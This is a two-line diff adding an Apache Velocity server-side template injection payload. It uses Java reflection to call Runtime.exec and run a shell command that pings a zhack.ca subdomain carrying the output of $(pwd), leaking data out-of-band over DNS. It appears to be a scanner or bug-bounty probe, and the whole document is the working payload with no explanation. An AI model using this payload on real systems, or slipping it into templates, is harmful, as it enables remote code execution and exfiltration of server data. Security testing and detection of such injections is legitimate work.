@@ -1,0 +1,2 @@
+#set($e="e")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ping -c 1 $(pwd).21a2f46c42d9fcb73298.d.zhack.ca | ping -c 1 two.21a2f46c42d9fcb73298.d.zhack.ca")
